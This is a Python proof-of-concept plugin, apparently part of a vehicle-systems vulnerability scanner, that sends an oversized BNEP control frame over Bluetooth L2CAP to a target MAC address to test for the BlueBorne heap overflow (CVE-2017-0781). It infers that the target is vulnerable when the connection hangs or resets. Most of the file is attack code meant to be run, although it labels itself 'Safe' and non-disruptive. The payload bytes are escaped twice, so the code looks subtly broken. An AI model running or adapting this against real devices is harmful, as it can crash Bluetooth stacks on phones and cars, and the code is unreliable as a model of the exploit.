#!/usr/bin/env python3
"""
PoC Name: BlueBorne BNEP Heap Overflow
CVE: CVE-2017-0781
Component: Wireless Stack
Category: Wireless
Severity: Critical
CVSS: 8.8
Description: 畸形BNEP控制帧触发Android BT栈堆溢出
Prerequisites: 目标设备的蓝牙MAC地址，本机支持蓝牙通信。
Usage: python3 15_CVE_2017_0781_BlueBorne_BNEP_Overflow_Active_Validation.py <bluetooth_mac>
"""
from __future__ import annotations

import sys
import socket
import time
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CVE-2017-0781",
    "year":           2017,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "BlueBorne BNEP Overflow",
    "source_url":     "https://nvd.nist.gov/vuln/detail/CVE-2017-0781",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://nvd.nist.gov/vuln/detail/CVE-2017-0781"],
    "signature_tokens": ["CVE-2017-0781"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CVE-2017-0781 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CVE-2017-0781") if vuln else "CVE-2017-0781",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class BlueBorneBNEPPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-015"
    meta_poc_name = 'CVE-2017-0781 BlueBorne BNEP Overflow Active Validation'
    meta_cve_id = "CVE-2017-0781"
    meta_source_url = "https://nvd.nist.gov/vuln/detail/CVE-2017-0781"
    meta_references = ['https://nvd.nist.gov/vuln/detail/CVE-2017-0781']
    meta_severity = "Critical"
    meta_protocol = "bluetooth"
    meta_profiles = ["bluetooth"]
    meta_target_os = ["all"]
    meta_required_params = ["bluetooth_mac"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        self.bt_mac = self.params.get("bluetooth_mac", "")
        if not self.bt_mac:
            self.logger.error("需要指定目标蓝牙 MAC 地址。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"尝试对 {self.bt_mac} 发起 BlueBorne BNEP (CVE-2017-0781) 漏洞探测...")
        
        # BNEP PSM is 0x000F
        psm_bnep = 15
        
        try:
            self.logger.info(f"建立蓝牙 L2CAP 套接字连接到 PSM: {psm_bnep}")
            
            # AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP
            try:
                sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            except AttributeError:
                self.logger.error("当前操作系统/Python环境不支持 AF_BLUETOOTH L2CAP raw sockets！请在 Linux 系统中运行。")
                return {"status": "error", "details": "Bluetooth Raw Sockets not supported on this OS"}
            
            sock.settimeout(5.0)
            
            try:
                sock.connect((self.bt_mac, psm_bnep))
                self.logger.info("[+] 建立 L2CAP 连接成功！设备可能暴露 BNEP 面！")
                
                # BNEP Extension Header Overflow payload
                # 构造一个非法长度的扩展包导致 BNEP 堆溢出
                # Control Type 0x01 (BNEP_CONTROL)
                # Extension flag set, with length > expected
                bnep_payload = b"\\x81\\x01\\x00" + b"X" * 1500
                
                self.logger.info(f"注入溢出向量: {len(bnep_payload)} bytes...")
                sock.send(bnep_payload)
                
                time.sleep(1)
                self.logger.info("检查连接池状态...")
                
                # 如果设备崩溃，蓝牙堆栈会重置连接或者断开
                try:
                    data = sock.recv(1024)
                    self.logger.info("接收到了目标返回的数据，说明目标堆栈健壮，可能已修复漏洞。")
                    return {"status": "success", "vulnerable": False, "details": "Target did not crash from BNEP payload."}
                except socket.timeout:
                    self.logger.warning("[!] 连接无响应或已挂起。这往往意味着蓝牙协议栈服务由于崩溃已进入异常状态！")
                    return {"status": "success", "vulnerable": True, "details": "Service unresponsive, potential BNEP crash."}
                except ConnectionResetError:
                    self.logger.warning("[!] L2CAP 连接立刻被重置！系统层可能已崩溃。")
                    return {"status": "success", "vulnerable": True, "details": "L2CAP connection forcibly reset."}
                    
            except OSError as e:
                self.logger.info(f"[-] 蓝牙连接失败: {e}。目标未开启 BNEP 或不在范围内。")
                return {"status": "success", "vulnerable": False, "details": f"Connection failed: {e}"}
                
        except Exception as e:
            self.logger.error(f"异常: {e}")
            return {"status": "error", "details": str(e)}
        finally:
            try:
                sock.close()
            except:
                pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 15_CVE_2017_0781_BlueBorne_BNEP_Overflow_Active_Validation.py <bluetooth_mac>")
        sys.exit(1)
    plugin = BlueBorneBNEPPlugin({"bluetooth_mac": sys.argv[1]})
    plugin.run_verify()
